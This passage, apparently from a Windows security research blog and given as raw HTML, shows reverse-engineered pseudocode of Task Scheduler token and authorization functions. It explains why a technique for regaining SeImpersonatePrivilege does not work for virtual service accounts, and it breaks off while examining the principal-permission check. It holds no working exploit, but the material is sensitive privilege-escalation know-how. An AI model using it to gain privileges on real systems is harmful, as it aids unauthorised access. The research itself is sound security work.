pre;\">&nbsp;&nbsp;HANDLE Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">LogonUserExExW</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Domain</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Password</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LOGON32_LOGON_SERVICE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LOGON32_PROVIDER_DEFAULT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">// ...</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"><span style=\"color: navy; font-weight: 700;\">}</span></span></p><div><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></div><p>This&nbsp;<i>UbpmpTokenGetNonInteractiveToken </i>function is taking the principal SID from the task registration or passed to <i>RunEx </i>and determining what it represents to get back the token. It checks if the SID is a service SID, by which is means the <i>NT SERVICE\\NAME</i>&nbsp;SID we used in the previous blog post. If it is it calls a separate function,&nbsp;<i>UbpmpTokenGetServiceAccountToken</i> to get the service token.</p><p>Otherwise if the SID is NS or LS then it specifies the well know names for those SIDs and called <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExEx</a> with the&nbsp;<i>LOGON32_LOGON_SERVICE</i> type. The <i>UbpmpTokenGetServiceAccountToken</i> function does the following:</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">TOKEN UbpmpTokenGetServiceAccountToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PSID PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">) </span><span>{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;LPCWSTR Name </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> UbpmUtilsGetAccountNamesFromSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;SC_HANDLE scm </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenSCManager</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SC_MANAGER_CONNECT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;SC_HANDLE service </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">scm</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Name</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SERVICE_ALL_ACCESS</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;HANDLE Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;GetServiceProcessToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">g_ScheduleServiceHandle</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> service</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p>This function gets the name from the service SID, which is the name of the service itself and opens it for all access rights (<i>SERVICE_ALL_ACCESS</i>). If that succeeds then it passes the service handle to an undocumented SCM API,&nbsp;<i>GetServiceProcessToken</i>, which returns the token for the service. Looking at the implementation in SCM this basically uses the exact same code as it would use for creating the token for starting the service.&nbsp;</p><p>This is why there's a distinction between LS/NS and a virtual service account using&nbsp;Cl\u00e9ment's technique. If you use LS/NS the task scheduler gets a fresh token from the LSA with no regards to how the service is configured. Therefore the new token has <i>SeImpersonatePrivilege </i>(or what ever else is allowed). However for a virtual service account the service asks the SCM for the service's token, as the SCM knows about what restrictions are in place it honours things like privileges or the SID type. Therefore the returned token will be stripped of <i>SeImpersonatePrivilege </i>again even though it'll technically be a different token to the currently running service.</p><p>Why does the task scheduler need some undocumented function to get the service token? As I mentioned in a <a href=\"https://www.tiraniddo.dev/2020/10/creating-your-own-virtual-service.html\">previous blog post</a> about virtual accounts only the SCM (well technically the first process to claim it's the SCM) is allowed to authenticate a token with a virtual service account. This seems kind of pointless if you ask me as you already need <i>SeTcbPrivilege </i>to create the service token, but it is what it is.</p><p>Okay, so now we know why Cl\u00e9ment's technique doesn't get you back any privileges. You might now be asking, so what? Well one interesting behavior came from looking at how the task scheduler determines if you're allowed to specify a service SID as a principal. In my blog post of creating a task running as <i>TrustedInstaller </i>I implied it needed administrator access, which is sort of true and sort of not. Let's see the function the task scheduler uses to determine if the caller's allowed to run a task as a specified principal.</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">BOOL IsPrincipalAllowed</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;User caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">FromImpersonationToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;RpcRevertToSelf</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">tsched</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">IsUserAdmin</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">||</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;caller.IsLocalSystem</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> TRUE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; 